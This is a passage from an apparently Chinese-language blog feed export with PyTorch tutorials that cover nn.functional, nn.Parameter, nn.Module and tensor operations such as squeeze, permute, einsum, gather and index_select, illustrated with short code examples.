class="number">28</span> * <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x_input.shape:&quot;</span>, x_input.shape)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用全连接层</span></span><br><span class="line">y_output = full_connect_layer(x_input) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y_output.shape:&quot;</span>, y_output.shape)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;y_output:&quot;</span>, y_output)</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191629071.png" alt="image-20211203163313390"></p><h2 id="3-nnfunctional常见函数">3 nn.functional（常见函数）</h2><h3 id="31-nnfunctional概述">3.1 nn.functional概述</h3><blockquote><p>nn.functional定义了创建神经网络所需要的一些常见的处理函数。如没有激活函数的神经元，各种激活函数等。</p></blockquote><ul><li>包含torch.nn库中所有函数，包含大量loss和activation function<ul><li>torch.nn.functional.conv2d(input, weight, bias=None, stride=1, padding=0, dilation=1, groups=1)</li><li>nn.functional.xxx是函数接口</li><li>nn.functional.xxx无法与nn.Sequential结合使用</li><li>没有学习参数的(eg. maxpool, loss_ func, activation func)<a href="http://xn--nn-gy2c4vz4a856fs0ap4ztl4ad2mv07c.functional.xn--xxxnn-zm6j.Xxx">等根据个人选择使用nn.functional.xxx或nn.Xxx</a></li><li>需要特别注意dropout层</li></ul></li></ul><h3 id="32-nnfunctional函数分类">3.2 nn.functional函数分类</h3><p>nn.functional包括神经网络前向和后向处理所需要到的常见函数</p><ul><li>神经元处理函数</li><li>激活函数</li></ul><h3 id="33-激活函数案例">3.3 激活函数案例</h3><ul><li>relu案例</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nn.functional.relu( )</span></span><br><span class="line"><span class="built_in">print</span>(y_output)</span><br><span class="line">out = nn.functional.relu(y_output)</span><br><span class="line"><span class="built_in">print</span>(out.shape)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure><h2 id="4-nnxxx和nnfunctionalxxx比较">4 nn.xxx和nn.functional.xxx比较</h2><h3 id="41-相同点">4.1 相同点</h3><ul><li><code>nn.Xxx</code>和<code>nn.functional.xxx</code>的实际功能是相同的，即<code>nn.Conv2d</code>和<code>nn.functional.conv2d</code> 都是进行卷积，<code>nn.Dropout</code> 和<code>nn.functional.dropout</code>都是进行dropout，。。。。。；</li><li>运行效率也是近乎相同。</li></ul><h3 id="42-不同点">4.2 不同点</h3><ul><li><code>nn.functional.xxx</code>是API函数接口，而<code>nn.Xxx</code>是对原始API函数<code>nn.functional.xxx</code>的类封装。</li><li>所有<code>nn.Xxx</code>都继承于于共同祖先<code>nn.Module</code>。这一点导致<code>nn.Xxx</code>除了具有<code>nn.functional.xxx</code>功能之外，内部附带了<code>nn.Module</code>相关的属性和方法，例如<code>train(), eval(),load_state_dict, state_dict</code> 等。</li><li><code>nn.Xxx</code>继承于<code>nn.Module</code>， 能够很好的与<code>nn.Sequential</code>结合使用， 而<code>nn.functional.xxx</code>无法与<code>nn.Sequential</code>结合使用。</li><li><code>nn.Xxx</code> 需要先实例化并传入参数，然后以函数调用的方式调用实例化的对象并传入输入数据。<code>nn.functional.xxx</code>同时传入输入数据和<code>weight, bias</code>等其他参数 。</li><li><code>nn.Xxx</code>不需要你自己定义和管理weight；而<code>nn.functional.xxx</code>需要你自己定义weight，每次调用的时候都需要手动传入weight, 不利于代码复用。</li></ul><h2 id="5-nnparameter类">5 nn.Parameter类</h2><h3 id="51-nnparameter概述">5.1 nn.Parameter概述</h3><blockquote><p>Parameter实际上也是tensor，也就是说是一个多维矩阵，是Variable类的一个特殊类。</p><p>当我们创建一个model时，nn会自动创建相应的参数parameter，并会自动累加到模型的Parameter 成员列表中。</p></blockquote><h3 id="52-单个全连接层中参数的个数">5.2 单个全连接层中参数的个数</h3><p>in_features的数量，决定的参数的个数   Y = WX + b,  X的维度就是in_features，X的维度决定的W的维度， 总的参数个数 = in_features + 1</p><p>out_features的数量，决定了全连接层中神经元的个数，因为每个神经元只有一个输出。</p><p>多少个输出，就需要多少个神经元。</p><p>总的W参数的个数=  in_features * out_features</p><p>总的b参数的个数=  1 * out_features</p><p>总的参数（W和B）的个数=  (in_features + 1) * out_features</p><h3 id="53-使用参数创建全连接层">5.3 使用参数创建全连接层</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nn.functional.linear( )</span></span><br><span class="line">x_input = torch.Tensor([<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x_input.shape:&quot;</span>, x_input.shape)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x_input      :&quot;</span>, x_input)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line">Weights1 = nn.Parameter(torch.rand(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Weights.shape:&quot;</span>, Weights1.shape)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Weights      :&quot;</span>, Weights1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line">Bias1 = nn.Parameter(torch.rand(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Bias.shape:&quot;</span>, Bias1.shape)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Bias      :&quot;</span>, Bias1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line">Weights2 = nn.Parameter(torch.Tensor(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Weights.shape:&quot;</span>, Weights2.shape)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Weights      :&quot;</span>, Weights2)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nfull_connect_layer&quot;</span>)</span><br><span class="line">full_connect_layer = nn.functional.linear(x_input, Weights1)</span><br><span class="line"><span class="built_in">print</span>(full_connect_layer)</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191629076.png" alt="image-20211203165921227"></p><h2 id="6-nnmodule类">6 nn.Module类</h2><ul><li>抽象概念，既可以表示神经网络中的某个层layer，也可以表示一个包含很多层的神经网络</li><li>modle.parameters()</li><li>modle.buffers()</li><li>modle.state_dict()</li><li>modle.modules()</li><li>forward(),to()</li></ul><h2 id="7-利用nnsequential类创建神经网络继承与nnmodule类">7 利用nn.Sequential类创建神经网络（继承与nn.Module类）</h2><blockquote><p>nn.Sequential是一个有序的容器，该类将按照传入构造器的顺序，依次创建相应的函数，并记录在Sequential类对象的数据结构中，同时以神经网络模块为元素的有序字典也可以作为传入参数。</p><p>因此，Sequential可以看成是有多个函数运算对象，串联成的神经网络，其返回的是Module类型的神经网络对象。</p></blockquote><h2 id="8自定义神经网络模型类继承于module类">8.自定义神经网络模型类（继承于Module类）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义网络模型：带relu的两层全连接神经网络</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;自定义新的神经网络模型的类&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NetC</span>(torch.nn.Module):</span><br><span class="line">    <span class="comment"># 定义神经网络</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n_feature, n_hidden, n_output</span>):</span><br><span class="line">        <span class="built_in">super</span>(NetC, self).__init__()</span><br><span class="line">        self.h1 = nn.Linear(n_feature, n_hidden)</span><br><span class="line">        self.relu1 = nn.ReLU()</span><br><span class="line">        self.out = nn.Linear(n_hidden, n_output)</span><br><span class="line">        self.softmax = nn.Softmax(dim=<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#定义前向运算</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># 得到的数据格式torch.Size([64, 1, 28, 28])需要转变为（64,784）</span></span><br><span class="line">        x = x.view(x.size()[<span class="number">0</span>],-<span class="number">1</span>) <span class="comment"># -1表示自动匹配</span></span><br><span class="line">        h1 = self.h1(x)</span><br><span class="line">        a1 =  self.relu1(h1)</span><br><span class="line">        out = self.out(a1)</span><br><span class="line">        a_out = self.softmax(out)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n实例化神经网络模型对象&quot;</span>)</span><br><span class="line">model = NetC(<span class="number">28</span>*<span class="number">28</span>, <span class="number">32</span>, <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(model)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n显示网络模型参数&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(model.parameters)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n定义神经网络样本输入&quot;</span>)</span><br><span class="line">x_input = torch.randn(<span class="number">2</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(x_input.shape)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n使用神经网络进行预测&quot;</span>)</span><br><span class="line">y_pred = model.forward(x_input)</span><br><span class="line"><span class="built_in">print</span>(y_pred)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pytorch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pytorch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>torch tensor操作</title>
      <link href="/2023/12/19/AILearning/pytorch/tensor%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/12/19/AILearning/pytorch/tensor%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="一-张量的基本操作">一、张量的基本操作</h1><p>Pytorch 中，张量的操作分为<strong>结构操作和数学运算</strong>，其理解就如字面意思。结构操作就是改变张量本身的结构，数学运算就是对张量的元素值完成数学运算。</p><ul><li>常使用的张量结构操作：维度变换（tranpose、view 等）、合并分割（split、chunk等）、索引切片（index_select、gather 等）。</li><li>常使用的张量数学运算：标量运算、向量运算、矩阵运算。</li></ul><h1 id="二-维度变换">二、维度变换</h1><h2 id="21-squeeze-vs-unsqueeze-维度增减"><strong>2.1 squeeze vs unsqueeze 维度增减</strong></h2><ul><li><strong>squeeze()</strong>：对 tensor 进行维度的压缩，去掉维数为 1 的维度。用法：torch.squeeze(a) 将 a 中所有为 1 的维度都删除，或者 a.squeeze(1) 是去掉 a中指定的维数为 1 的维度。</li><li><strong>unsqueeze()</strong>：对数据维度进行扩充，给指定位置加上维数为 1 的维度。用法：torch.unsqueeze(a, N)，或者 a.unsqueeze(N)，在 a 中指定位置 N 加上一个维数为 1 的维度。</li></ul><p>squeeze 用例程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = torch.rand(<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">b = torch.squeeze(a)</span><br><span class="line">c = a.squeeze(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(b.shape)</span><br><span class="line"><span class="built_in">print</span>(c.shape)</span><br></pre></td></tr></table></figure><p>程序输出结果如下：</p><blockquote><p>torch.Size([3, 3]) torch.Size([1, 3, 3])</p></blockquote><p>unsqueeze 用例程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = torch.rand(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">y1 = torch.unsqueeze(x, <span class="number">0</span>)</span><br><span class="line">y2 = x.unsqueeze(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(y1.shape)</span><br><span class="line"><span class="built_in">print</span>(y2.shape)</span><br></pre></td></tr></table></figure><p>程序输出结果如下：</p><blockquote><p>torch.Size([1, 3, 3]) torch.Size([1, 3, 3])</p></blockquote><h2 id="22-transpose-vs-permute-维度交换"><strong>2.2 transpose vs permute 维度交换</strong></h2><p>torch.transpose() 只能交换两个维度，而 .permute() 可以自由交换任意位置。函数定义如下：</p><ul><li>transpose(dim0, dim1) → Tensor # See torch.transpose()</li><li>permute(*dims) → Tensor # dim(int). Returns a view of the original tensor with its dimensions permuted.</li></ul><p>在 CNN 模型中，我们经常遇到交换维度的问题，举例：四个维度表示的 tensor：[batch, channel, h, w]（nchw），如果想把 channel 放到最后去，形成[batch, h, w, channel]（nhwc），如果使用 torch.transpose() 方法，至少要交换两次（先 1 3 交换再 1 2 交换），而使用 .permute() 方法只需一次操作，更加方便。例子程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">b = torch.rand(<span class="number">1</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># torch.Size([1, 3, 28, 32]</span></span><br><span class="line"><span class="built_in">print</span>(b.transpose(<span class="number">1</span>, <span class="number">3</span>).shape)</span><br><span class="line"><span class="comment"># torch.Size([1, 32, 28, 3])</span></span><br><span class="line"><span class="built_in">print</span>(b.transpose(<span class="number">1</span>, <span class="number">3</span>).transpose(<span class="number">1</span>, <span class="number">2</span>).shape)</span><br><span class="line"><span class="comment"># torch.Size([1, 28, 32, 3])</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b.permute(<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>).shape)</span><br><span class="line"><span class="comment"># torch.Size([1, 28, 32, 3]</span></span><br></pre></td></tr></table></figure><h2 id="23-reshape-vs-view"><strong>2.3 reshape vs view</strong></h2><blockquote><p>view只适合对满足连续性条件（contiguous）的tensor进行操作，而reshape同时还可以对不满足连续性条件的tensor进行操作，具有更好的鲁棒性。view能干的reshape都能干，如果view不能干就可以用reshape来处理。更多可看[1]</p></blockquote><h2 id="24-einsum"><strong>2.4 einsum</strong></h2><p>首先看下 einsum 实现矩阵乘法的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a = torch.rand(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">b = torch.rand(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 语义解析：</span></span><br><span class="line"><span class="comment"># 输入a：2阶张量，下标为ik</span></span><br><span class="line"><span class="comment"># 输入b: 2阶张量，下标为kj</span></span><br><span class="line"><span class="comment"># 输出o: 2阶张量，下标为i和j</span></span><br><span class="line">c = torch.einsum(<span class="string">&quot;ik,kj-&gt;ij&quot;</span>, [a, b])</span><br><span class="line"><span class="comment"># 等价操作 torch.mm(a, b)</span></span><br><span class="line"></span><br><span class="line">a = np.arange(<span class="number">60.</span>).reshape(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">b = np.arange(<span class="number">24.</span>).reshape(<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 语义解析：</span></span><br><span class="line"><span class="comment"># 输入a：3阶张量，下标为ijk</span></span><br><span class="line"><span class="comment"># 输入b: 3阶张量，下标为jil</span></span><br><span class="line"><span class="comment"># 输出o: 2阶张量，下标为k和l</span></span><br><span class="line">c = np.einsum(<span class="string">&#x27;ijk,jil-&gt;kl&#x27;</span>, a, b)</span><br></pre></td></tr></table></figure><p>这个方法可以实现矩阵乘法，但是也可以用来更换维度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语义解析:</span></span><br><span class="line"><span class="comment"># 当后面只有一个张量时，就是对自己维度进行变换</span></span><br><span class="line"><span class="comment"># 比较常用的就是将chanel换到最后</span></span><br><span class="line">x = torch.einsum(<span class="string">&#x27;nchw-&gt;nhwc&#x27;</span>, x)</span><br></pre></td></tr></table></figure><blockquote><p>更多可看[2]</p></blockquote><h1 id="三-索引切片">三、索引切片</h1><h2 id="31-规则索引切片方式"><strong>3.1 规则索引切片方式</strong></h2><p>张量的索引切片方式和 numpy、python 多维列表几乎一致，都可以通过索引和切片对部分元素进行修改。切片时支持缺省参数和省略号。实例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = torch.randint(<span class="number">1</span>,<span class="number">10</span>,[<span class="number">3</span>,<span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">tensor([[<span class="number">8</span>, <span class="number">2</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">9</span>, <span class="number">9</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">0</span>] <span class="comment"># 第 1 行数据</span></span><br><span class="line">tensor([<span class="number">8</span>, <span class="number">2</span>, <span class="number">9</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">2</span>][<span class="number">2</span>]</span><br><span class="line">tensor(<span class="number">9</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">0</span>:<span class="number">3</span>,:]  <span class="comment"># 第1至第3行，全部列</span></span><br><span class="line">tensor([[<span class="number">8</span>, <span class="number">2</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">9</span>, <span class="number">9</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">0</span>:<span class="number">2</span>,:]  <span class="comment"># 第1行至第2行</span></span><br><span class="line">tensor([[<span class="number">8</span>, <span class="number">2</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">1</span>:,-<span class="number">1</span>]  <span class="comment"># 第2行至最后行，最后一列</span></span><br><span class="line">tensor([<span class="number">9</span>, <span class="number">9</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">1</span>:,::<span class="number">2</span>] <span class="comment"># 第1行至最后行，第0列到最后一列每隔两列取一列</span></span><br><span class="line">tensor([[<span class="number">2</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">9</span>]])</span><br></pre></td></tr></table></figure><p>以上切片方式相对规则，对于不规则的切片提取,可以使用 torch.index_select, torch.take, torch.gather, torch.masked_select。</p><h2 id="32-gather-和-torchindex_select-算子"><strong>3.2 gather 和 torch.index_select 算子</strong></h2><blockquote><p>gather 算子的用法比较难以理解，在翻阅了官方文档和网上资料后，我有了一些自己的理解。</p></blockquote><p>1，gather 是不规则的切片提取算子（Gathers values along an axis specified by dim. 在指定维度上根据索引 index 来选取数据）。函数定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.gather(<span class="built_in">input</span>, dim, index, *, sparse_grad=<span class="literal">False</span>, out=<span class="literal">None</span>) → Tensor</span><br></pre></td></tr></table></figure><p><strong>参数解释：</strong></p><ul><li>input (Tensor) – the source tensor.</li><li>dim (int) – the axis along which to index.</li><li>index (LongTensor) – the indices of elements to gather.</li></ul><p>对于 3D tensor，output 值的定义如下： gather 的官方定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">out[i][j][k] = <span class="built_in">input</span>[index[i][j][k]][j][k]  <span class="comment"># if dim == 0</span></span><br><span class="line">out[i][j][k] = <span class="built_in">input</span>[i][index[i][j][k]][k]  <span class="comment"># if dim == 1</span></span><br><span class="line">out[i][j][k] = <span class="built_in">input</span>[i][j][index[i][j][k]]   <span class="comment"># if dim == 2</span></span><br></pre></td></tr></table></figure><p>下面结合 2D 和 3D tensor 的用例来直观理解算子用法。<br>（1）对于 2D tensor 的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> torch</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = torch.arange(<span class="number">0</span>, <span class="number">16</span>).view(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">tensor([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">        [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">        [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>],</span><br><span class="line">        [<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>index = torch.tensor([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]])  <span class="comment"># 选取对角线元素</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.gather(a, <span class="number">0</span>, index)</span><br><span class="line">tensor([[ <span class="number">0</span>,  <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>]])</span><br></pre></td></tr></table></figure><p>output 值定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按照 index = tensor([[0, 1, 2, 3]])顺序作用在行上索引依次为0,1,2,3</span></span><br><span class="line">a[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">a[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">5</span></span><br><span class="line">a[<span class="number">2</span>][<span class="number">2</span>] = <span class="number">10</span></span><br><span class="line">a[<span class="number">3</span>][<span class="number">3</span>] = <span class="number">15</span></span><br></pre></td></tr></table></figure><p>（2）索引更复杂的 2D tensor 例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = torch.tensor([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">tensor([[<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>torch.gather(t, <span class="number">1</span>, torch.tensor([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>]]))</span><br><span class="line">tensor([[ <span class="number">1</span>,  <span class="number">1</span>],</span><br><span class="line">        [ <span class="number">4</span>,  <span class="number">3</span>]])</span><br></pre></td></tr></table></figure><p>output 值的计算如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">output[i][j] = <span class="built_in">input</span>[i][index[i][j]]  <span class="comment"># if dim = 1</span></span><br><span class="line">output[<span class="number">0</span>][<span class="number">0</span>] = <span class="built_in">input</span>[<span class="number">0</span>][index[<span class="number">0</span>][<span class="number">0</span>]] = <span class="built_in">input</span>[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">output[<span class="number">0</span>][<span class="number">1</span>] = <span class="built_in">input</span>[<span class="number">0</span>][index[<span class="number">0</span>][<span class="number">1</span>]] = <span class="built_in">input</span>[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">output[<span class="number">1</span>][<span class="number">0</span>] = <span class="built_in">input</span>[<span class="number">1</span>][index[<span class="number">1</span>][<span class="number">0</span>]] = <span class="built_in">input</span>[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">4</span></span><br><span class="line">output[<span class="number">1</span>][<span class="number">1</span>] = <span class="built_in">input</span>[<span class="number">1</span>][index[<span class="number">1</span>][<span class="number">1</span>]] = <span class="built_in">input</span>[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>总结：<strong>可以看到 gather 是通过将索引在指定维度 dim 上的值替换为 index 的值，但是其他维度索引不变的情况下获取 tensor 数据</strong>。直观上可以理解为对矩阵进行重排，比如对每一行(dim=1)的元素进行变换，比如 torch.gather(a, 1, torch.tensor([[1,2,0], [1,2,0]])) 的作用就是对 矩阵 a 每一行的元素，进行 permtute(1,2,0) 操作。</p><p>2，理解了 gather 再看 index_select 就很简单，函数作用是返回沿着输入张量的指定维度的指定索引号进行索引的张量子集。函数定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torch.index_select(<span class="built_in">input</span>, dim, index, *, out=<span class="literal">None</span>) → Tensor</span><br></pre></td></tr></table></figure><p>函数返回一个新的张量，它使用数据类型为 LongTensor 的 index 中的条目沿维度 dim 索引输入张量。返回的张量具有与原始张量（输入）相同的维数。 维度尺寸与索引长度相同； 其他尺寸与原始张量中的尺寸相同。实例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = torch.randn(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">tensor([[ <span class="number">0.1427</span>,  <span class="number">0.0231</span>, -<span class="number">0.5414</span>, 